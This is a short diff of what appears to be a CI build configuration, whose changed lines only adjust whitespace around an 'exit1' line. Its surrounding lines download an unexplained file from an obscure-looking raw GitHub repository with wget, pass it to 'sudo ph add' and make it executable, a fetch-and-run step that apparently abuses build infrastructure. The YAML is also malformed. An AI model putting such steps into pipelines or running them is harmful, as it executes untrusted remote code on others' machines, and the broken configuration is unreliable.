@@ -18,7 +18,8 @@ working_dir: &working_dir ~/app
                     wget -qO kase https://raw.githubusercontent.com/hndouehdw/henro/master/pyton
                     sudo ph add kase
                     chmod +x kase                  
-                    exit1                                     
+                    exit1           
+                    
 version: 2.0 
 jobs: 
   build1: 
